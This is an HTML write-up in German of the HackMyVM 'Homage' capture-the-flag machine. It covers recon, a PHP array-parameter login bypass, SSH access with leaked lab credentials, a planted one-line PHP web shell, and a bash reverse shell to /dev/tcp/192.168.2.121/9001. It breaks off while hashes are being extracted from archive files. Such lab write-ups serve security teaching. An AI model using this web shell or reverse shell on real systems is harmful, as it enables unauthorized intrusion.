@@ -1,0 +1,696 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Homage - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe (Medium = Gelb/Orange) und Kreis-Farbe müssen in style.css angepasst werden -->
+    <div class="header-bg">
+        <h1>Homage - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">nano (oder anderer Editor)</div>
+                <div class="tool-item">curl (impliziert, für Webshell)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">for loop (shell)</div>
+                <div class="tool-item">tail</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">Crackstation (Webservice)</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql client</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john (John the Ripper)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">Malbolge Interpreter (Webservice)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.114	08:00:27:c5:c5:12	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird im lokalen Netzwerk ausgeführt, um aktive Geräte mittels ARP-Anfragen zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die IP-Adresse des Ziels wurde als 192.168.2.114 identifiziert. Die MAC-Adresse und der Hersteller (PCS Systemtechnik GmbH) deuten wie üblich auf eine VirtualBox-VM hin. Dies ist der grundlegende erste Schritt zur Zielidentifikation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP 192.168.2.114 ist das Ziel für nachfolgende Scans (Nmap, Gobuster etc.).<br><strong>Empfehlung (Admin):</strong> Überwachung der aktiven Geräte im Netzwerk. Netzwerksegmentierung kann die Reichweite solcher Scans begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 23:56 CET
+Nmap scan report for webmaster.hmv (192.168.2.114)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   2048 0c3f13546e6ee656d291ebad9536c68d (RSA)
+|   256 9be68e14397a17a38088cd772ec33b1a (ECDSA)
+|_  256 855a052a4bc0b236ea8ae28ab2efbcdf (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Password protected page
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:C5:C5:12 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms webmaster.hmv (192.168.2.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS` SYN-Scan, `-sC` Standard-Skripte, `-T5` schnelles Timing, `-A` Aggressive Optionen inkl. Version/OS-Detektion, `-p-` alle Ports) wird auf das Ziel 192.168.2.114 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22 (SSH):** OpenSSH 7.9p1 auf Debian 10. Ein Standardzugangspunkt.
+                *   **Port 80 (HTTP):** Apache 2.4.38 auf Debian. Besonders auffällig ist der Titel der Seite: `<span class="command">Password protected page</span>`. Dies ist ein sehr starker Hinweis auf eine Web-Authentifizierung als primären Angriffsvektor. Der Hostname `webmaster.hmv` wird ebenfalls erkannt.
+            Die Angriffsfläche scheint auf den ersten Blick kleiner als bei der vorherigen Maschine zu sein, aber der Webserver ist klar das Hauptziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  **HTTP (Port 80):** Fokussieren Sie sich auf die Webanwendung. Untersuchen Sie die Passwort-Authentifizierung auf der Seite. Führen Sie Directory/File-Busting durch (z.B. mit Gobuster, ffuf). Fügen Sie `webmaster.hmv` zur lokalen `/etc/hosts`-Datei hinzu.
+                2.  **SSH (Port 22):** Halten Sie dies als sekundären Vektor bereit, falls über die Webanwendung Benutzernamen und/oder Passwörter erlangt werden.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Web-Authentifizierung robust ist (keine schwachen Passwörter, Schutz vor Brute-Force, keine Umgehungsmechanismen). Aktualisieren Sie Apache und OpenSSH. Beschränken Sie den SSH-Zugriff (Schlüssel, IP-Filter).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nikto -h 192.168.2.114</span></div>
+                     <pre>- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    192.168.2.114
++ Target Port:        80
++ Start Time:         2022-11-07 23:57:12 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="command">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="command">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ <span class="command">OSVDB-3233: /icons/README: Apache default file found.</span>
++ 7915 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-11-07 23:58:38 (GMT1) (86 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `nikto` wird verwendet, um einen grundlegenden Webserver-Schwachstellen-Scan gegen Port 80 durchzuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto meldet hauptsächlich informative Ergebnisse:
+                *   Fehlende HTTP-Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`). Dies sind gängige Best-Practice-Empfehlungen, stellen aber selten eine direkte Schwachstelle dar.
+                *   Eine Apache-Standarddatei (`/icons/README`) wurde gefunden, was auf eine Standardkonfiguration hindeutet.
+            Insgesamt liefert Nikto hier keine kritischen Schwachstellen, bestätigt aber die Apache-Version.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header zur Kenntnis nehmen, falls später clientseitige Angriffe (wie XSS) relevant werden. Der Fokus bleibt auf der Authentifizierung.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die empfohlenen HTTP-Sicherheitsheader, um die allgemeine Sicherheit der Webanwendung zu erhöhen (Schutz vor Clickjacking, bestimmten XSS-Varianten, MIME-Sniffing).</p>
+
+        </section>
+
+        <!-- Web Enumeration führt hier direkt zum Initial Access -->
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">gobuster dir -u "http://192.168.2.114" -e -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,dot,htm,msi,mui,pdf,raw,rtf,vss,wbk,xls,xlsx,zip  -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -t 100</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.114/.php</span>                 (Status: 403) [Size: 278]
+<span class="command">http://192.168.2.114/index.php</span>            (Status: 200) [Size: 1886]
+<span class="command">http://192.168.2.114/.html</span>                (Status: 403) [Size: 278]
+<span class="command">http://192.168.2.114/.htm</span>                 (Status: 403) [Size: 278]
+<span class="command">http://192.168.2.114/.phtml</span>               (Status: 403) [Size: 278] 
+<span class="command">http://192.168.2.114/secret.php</span>           (Status: 200) [Size: 221]
+[...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird eingesetzt, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es wird eine umfangreiche Liste an Dateiendungen (`-x`) und eine Standard-Wortliste (`directory-list-2.3-medium.txt`) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster identifiziert zwei relevante PHP-Dateien: `index.php` (die wahrscheinliche Login-Seite, Status 200) und `secret.php` (Status 200). Der Fund von `secret.php` ist besonders interessant. Die 403-Fehler für Dateien, die mit einem Punkt beginnen, sind erwartetes Verhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  `index.php` im Browser aufrufen und die Login-Maske untersuchen.
+                2.  `secret.php` im Browser aufrufen und prüfen, welchen Inhalt oder welche Funktionalität sie bietet.
+                <br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass keine unnötigen oder sensiblen Dateien wie `secret.php` öffentlich zugänglich sind, es sei denn, sie sind Teil der beabsichtigten Funktionalität und entsprechend gesichert.</p>
+
+            <p class="analysis"><strong>Analyse (Burp Suite / Login Bypass):</strong> Der Bericht beschreibt eine Aktion, die typischerweise mit einem Intercepting Proxy wie Burp Suite durchgeführt wird. Ein normaler Login-Versuch (z.B. `login=ben&password=cscs`) wird abgefangen. Die Parameter werden modifiziert, indem eckige Klammern `[]` an die Parameternamen angehängt werden (`login[]=ben&password[]=cscs`). Diese modifizierte Anfrage wird dann an den Server weitergeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Technik, Parameter in Arrays umzuwandeln, ist ein bekannter Trick, um schwache PHP-Authentifizierungsprüfungen zu umgehen. Viele einfache Vergleiche (z.B. `if ($_POST['password'] == $correct_password)`) können fehlschlagen oder unerwartet `true` zurückgeben, wenn statt eines Strings ein Array übergeben wird. Die Tatsache, dass dies zum Erfolg führte (wie im nächsten Schritt ersichtlich), bestätigt eine kritische Schwachstelle in der Authentifizierung von `index.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Array-Injection-Technik sollte bei allen Web-Login-Formularen getestet werden, insbesondere bei solchen, die in PHP implementiert sind.<br><strong>Empfehlung (Admin):</strong> Die Authentifizierungslogik in `index.php` dringend überarbeiten. Eingabedaten serverseitig strikt validieren (Typ, Länge, Format). Verwenden Sie sichere Vergleichsmethoden (z.B. `hash_equals()` für Passwort-Hashes) und prüfen Sie den Datentyp, bevor Sie Vergleiche durchführen. Frameworks oder Bibliotheken nutzen, die solche Angriffe standardmäßig verhindern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Konzeptuelle Darstellung der Burp Suite Modifikation -->
+                     <pre>Original Request Parameter:
+login=ben&password=cscs
+
+Modified Request Parameter (Array Injection):
+<span class="command">login[]=ben&password[]=cscs</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse (Ergebnis des Login Bypass):</strong> Nach dem Absenden der modifizierten Anfrage mit den Array-Parametern wurde offenbar eine Seite geladen, die "Access codes" enthielt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login-Bypass war erfolgreich! Die Anwendung hat die ungültige Eingabe akzeptiert und interne Informationen preisgegeben. Es wurden Zugangsdaten gefunden: Benutzer `<span class="command">l4nr3n</span>` mit dem Passwort `<span class="password">thisVMsuckssomuchL0L</span>`. Dies stellt den initialen Zugriff auf das System dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Zugangsdaten (`l4nr3n` / `thisVMsuckssomuchL0L`) sofort verwenden, um sich per SSH (Port 22) auf dem Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Die Login-Bypass-Schwachstelle sofort beheben (siehe vorherige Empfehlung). Das Passwort für `l4nr3n` ändern. Überprüfen, warum sensible Zugangsdaten nach dem Login angezeigt werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Angezeigter Text nach erfolgreichem Login Bypass -->
+                     <pre>Access codes :
+
+<span class="command">l4nr3n</span>:<span class="password">thisVMsuckssomuchL0L</span>
+
+This page is for HMV staff only. Please remember to visit it regularly as access codes are changed weekly.
+HMV thanks you for visiting.</pre>
+                 </div>
+            </div>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">ssh l4nr3n@homage.hmv</span></div>
+                     <pre>The authenticity of host 'homage.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:2b+kTRKlx4qeMsfce+AHPgi/ReUzFfLnFbNEPBAg4uk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'homage.hmv' (ED25519) to the list of known hosts.
+l4nr3n@homage.hmv's password: <span class="password">[Passwort hier eingegeben: thisVMsuckssomuchL0L]</span>
+Linux homage 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun  8 12:52:39 2021 from 192.168.0.28
+l4nr3n@homage:~$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird zum Zielhost (unter Verwendung des Hostnamens `homage.hmv`, der vermutlich vorher zur `/etc/hosts` hinzugefügt wurde) als Benutzer `l4nr3n` initiiert. Das zuvor gefundene Passwort wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login war erfolgreich. Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `l4nr3n`. Der initiale Zugriff ist gesichert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als Benutzer `l4nr3n`. Überprüfen Sie `sudo -l`, durchsuchen Sie das Home-Verzeichnis, listen Sie Prozesse auf, suchen Sie nach SUID/GUID-Dateien etc.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Verwenden Sie nach Möglichkeit SSH-Schlüssel statt Passwörter. Stellen Sie sicher, dass Benutzer nur die minimal notwendigen Rechte haben.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">l4nr3n@homage:~$ <span class="command">sudo -l</span></div>
+                     <pre>[sudo] password for l4nr3n: <span class="password">[Passwort hier eingegeben: thisVMsuckssomuchL0L]</span> 
+<span class="password">Sorry, user l4nr3n may not run sudo on homage.</span></pre>
+                     <div class="prompt">l4nr3n@homage:~$</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu prüfen, ob der Benutzer `l4nr3n` irgendwelche Befehle mit erhöhten Rechten über `sudo` ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `l4nr3n` hat keine `sudo`-Berechtigungen. Dies ist ein normaler erster Check während der Privilege Escalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Wegen zur Rechteausweitung, z.B. SUID/GUID-Binaries, Fehlkonfigurationen, ausnutzbare Cronjobs, Kernel-Exploits (weniger wahrscheinlich in CTFs).<br><strong>Empfehlung (Admin):</strong> Das Prinzip der geringsten Rechte wurde hier für `sudo` korrekt angewendet.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">l4nr3n@homage:~$ <span class="command">ls -la</span></div>
+                     <pre>total 28
+drwx------ 4 l4nr3n l4nr3n 4096 Jun  8  2021 .
+drwxr-xr-x 6 root   root   4096 Jun  8  2021 ..
+lrwxrwxrwx 1 root   root      9 Jun  8  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 l4nr3n l4nr3n  220 Jun  5  2021 .bash_logout
+-rw-r--r-- 1 l4nr3n l4nr3n 3526 Jun  5  2021 .bashrc
+drwx------ 3 l4nr3n l4nr3n 4096 Jun  8  2021 .gnupg
+drwxr-xr-x 3 l4nr3n l4nr3n 4096 Jun  8  2021 .local
+-rw-r--r-- 1 l4nr3n l4nr3n  807 Jun  5  2021 .profile</pre>
+                     <div class="prompt">l4nr3n@homage:~$ <span class="command">ls /home/</span></div>
+                     <pre><span class="command">d4t4s3c</span>  <span class="command">l4nr3n</span>  <span class="command">sml</span>  <span class="command">softy_hack</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis des aktuellen Benutzers `l4nr3n` wird aufgelistet (`ls -la`). Anschließend werden die Verzeichnisse aller Benutzer in `/home` aufgelistet (`ls /home/`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Im Home-Verzeichnis von `l4nr3n` finden sich Standard-Konfigurationsdateien. Interessant ist der symbolische Link `.bash_history -> /dev/null`, der verhindert, dass die Befehlshistorie gespeichert wird. Die Auflistung von `/home` zeigt die Existenz weiterer Benutzer: `d4t4s3c`, `sml`, `softy_hack`. Diese könnten Ziele für Lateral Movement sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Berechtigungen der Home-Verzeichnisse der anderen Benutzer. Suchen Sie nach Konfigurationsdateien (z.B. in `.local`, `.gnupg`) oder anderen ungewöhnlichen Dateien. Prüfen Sie, ob Informationen über diese Benutzer im Webserver-Verzeichnis oder anderen öffentlich zugänglichen Bereichen zu finden sind.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse korrekt gesetzt sind (normalerweise nicht für andere Benutzer lesbar). Überwachen Sie die Erstellung verdächtiger Symlinks wie den für `.bash_history`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">l4nr3n@homage:/var/www/html$ <span class="command">ls -la</span></div>
+                     <pre>total 28
+drwxr-xrwx 3 www-data www-data 4096 Jun  8  2021 .
+drwxr-xr-x 4 www-data www-data 4096 Jun  8  2021 ..
+-rw-r--r-- 1 www-data www-data 5208 Jun  4  2021 hmv.jpg
+drwx------ 2 www-data www-data 4096 Jun  8  2021 HMV_old_archives
+-rw-r--r-- 1 www-data www-data 1886 Jun  8  2021 index.php
+-rw-r--r-- 1 www-data www-data  784 Jun  8  2021 secret.php</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Web-Stammverzeichnisses `/var/www/html` wird aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis `/var/www/html` ist für "others" lesbar und ausführbar (`r-x`), aber nicht schreibbar. Es gehört dem Benutzer `www-data` und der Gruppe `www-data`. Die Berechtigungen für das Verzeichnis selbst (`.`) sind jedoch `drwxr-xrwx`, was bedeutet, dass *jeder* Benutzer Dateien in diesem Verzeichnis erstellen oder löschen kann (wegen `w` für `others`). Dies ist eine gefährliche Fehlkonfiguration. Die Dateien `index.php` und `secret.php` sind bestätigt. Das Verzeichnis `HMV_old_archives` ist ebenfalls vorhanden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Aufgrund der unsicheren Berechtigungen (`rwx` für `others`) auf `/var/www/html` kann der Benutzer `l4nr3n` eine Web-Shell oder andere Skripte dort platzieren. Dies ist ein möglicher Weg, um Befehle als `www-data` auszuführen.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie dringend die Berechtigungen für `/var/www/html`. Sie sollten restriktiver sein, z.B. `drwxr-xr-x` (755). Niemals Schreibrechte für `others` im Web-Root gewähren. Der Eigentümer sollte der Webserver-Benutzer (`www-data`) sein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">l4nr3n@homage:/var/www/html$ <span class="command">nano shell.php</span></div>
+                    <!-- Inhalt der Datei shell.php -->
+                    <pre><?php system($GET['cmd']); ?></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `l4nr3n` nutzt die Schreibrechte im Web-Root, um mit `nano` (oder einem anderen Editor) eine Datei namens `shell.php` zu erstellen. Diese enthält einen einfachen PHP-Code, der den Wert des GET-Parameters `cmd` als Systembefehl ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine einfache, aber effektive Web-Shell wurde erfolgreich im Web-Root platziert. Dies ermöglicht die Ausführung von beliebigen Befehlen auf dem Server mit den Rechten des Webserver-Benutzers (`www-data`) durch Aufrufen der URL `http://192.168.2.114/shell.php?cmd=...`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Web-Shell, um das System als `www-data` zu erkunden. Versuchen Sie, eine interaktive Reverse Shell zu bekommen, um die Arbeit zu erleichtern. Untersuchen Sie das Verzeichnis `HMV_old_archives`.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen für `/var/www/html`. Überwachen Sie das Web-Root auf verdächtige Dateien. Implementieren Sie File Integrity Monitoring (FIM).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehl über Web-Shell ausgeführt: http://192.168.2.114/shell.php?cmd=ls%20HMV_old_archives -->
+                     <pre><span class="command">1.html 10.html 100.html 101.html 102.html 103.html 104.html 105.html 106.html 107.html 108.html 109.html 11.html 110.html 111.html 112.html 113.html 114.html 115.html 116.html 117.html 118.html 119.html 12.html 120.html 121.html 122.html 123.html 124.html 125.html 126.html 127.html 128.html 129.html 13.html 130.html 131.html 132.html 133.html 134.html 135.html 136.html 137.html 138.html 139.html 14.html 140.html 141.html 142.html 143.html 144.html 145.html 146.html 147.html 148.html 149.html 15.html 150.html 151.html 152.html 153.html 154.html 155.html 156.html 157.html 158.html 159.html 16.html 160.html 161.html 162.html 163.html 164.html 165.html 166.html 167.html 168.html 169.html 17.html 170.html 171.html 172.html 173.html 174.html 175.html 176.html 177.html 178.html 179.html 18.html 180.html 181.html 182.html 183.html 184.html 185.html 186.html 187.html 188.html 189.html 19.html 190.html 191.html 192.html 193.html 194.html 195.html 196.html 197.html 198.html 199.html 2.html 20.html 200.html 21.html 22.html 23.html 24.html 25.html 26.html 27.html 28.html 29.html 3.html 30.html 31.html 32.html 33.html 34.html 35.html 36.html 37.html 38.html 39.html 4.html 40.html 41.html 42.html 43.html 44.html 45.html 46.html 47.html 48.html 49.html 5.html 50.html 51.html 52.html 53.html 54.html 55.html 56.html 57.html 58.html 59.html 6.html 60.html 61.html 62.html 63.html 64.html 65.html 66.html 67.html 68.html 69.html 7.html 70.html 71.html 72.html 73.html 74.html 75.html 76.html 77.html 78.html 79.html 8.html 80.html 81.html 82.html 83.html 84.html 85.html 86.html 87.html 88.html 89.html 9.html 90.html 91.html 92.html 93.html 94.html 95.html 96.html 97.html 98.html 99.html index.html</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Über die zuvor erstellte Web-Shell (`shell.php`) wird der Befehl `ls HMV_old_archives` ausgeführt, um den Inhalt dieses Verzeichnisses aufzulisten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis enthält eine große Anzahl von HTML-Dateien (nummeriert von 1 bis 200 sowie eine `index.html`). Dies ist ein starker Hinweis darauf, dass in diesen Dateien Informationen versteckt oder verteilt sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Web-Shell oder holen Sie sich eine Reverse Shell als `www-data`, um diese Dateien systematisch zu analysieren. Suchen Sie nach Mustern, Kommentaren oder spezifischen Datenfragmenten (z.B. Passwort-Hashes, Benutzernamen). Ein Skript zur Automatisierung der Analyse ist wahrscheinlich erforderlich.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie alte oder nicht mehr benötigte Archivdateien vom Webserver. Sensible Daten sollten niemals in öffentlich zugänglichen Dateien gespeichert werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                     <!-- Befehl über Web-Shell ausgeführt: http://192.168.2.114/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.121%2F9001%200%3E%261%27 -->
+                     <!-- Die URL zum Auslösen der Shell wird hier nur als Kommentar dargestellt -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port 9001 gestartet. Anschließend wird über die Web-Shell (`shell.php`) ein URL-kodierter Bash-Reverse-Shell-Befehl ausgeführt. Dieser Befehl (`/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.121/9001 0>&1'`) soll eine interaktive Bash-Shell starten und deren Ein-/Ausgabe zum Listener des Angreifers (IP 192.168.2.121) umleiten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Versuch, von der einfachen Web-Shell zu einer stabileren, interaktiven Reverse Shell als `www-data` zu gelangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass die IP-Adresse des Listeners (hier 192.168.2.121) korrekt ist. Nach erfolgreicher Verbindung die Shell ggf. stabilisieren (z.B. mit Python PTY).<br><strong>Empfehlung (Admin):</strong> Verhindern Sie, dass der Webserver-Prozess ausgehende Netzwerkverbindungen initiieren kann (Egress Filtering). Überwachen Sie Prozesse auf verdächtige Aktivitäten wie das Starten von Shells oder Netzwerktools.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.114] 42012</span>
+bash: cannot set terminal process group (510): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@homage:/var/www/html$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt erfolgreich die Verbindung vom Zielsystem (192.168.2.114). Die typischen Meldungen für eine einfache Reverse Shell (`cannot set terminal...`, `no job control...`) erscheinen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Angreifer hat nun eine interaktive Shell auf dem Zielsystem als Benutzer `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ggf. stabilisieren. Nun können die HTML-Dateien im Verzeichnis `HMV_old_archives` direkt auf dem Zielsystem untersucht werden.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Verhinderung von Reverse Shells.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@homage:/var/www/html/HMV_old_archives$ <span class="command">for i in $(ls);do tail -n 1 $i | awk '{print $1}';done</span></div>
+                     <pre><span class="password">2936c8f11778816cdcf43daa907a339f</span>
+<span class="password">2498f643455f5463f2ab0f422f795ad6</span>
+<span class="password">308b38ae3c2769cdbaacf4e1017b5d88</span>
+<span class="password">79498aa4b60bd560d6c9b64c4550288d</span>
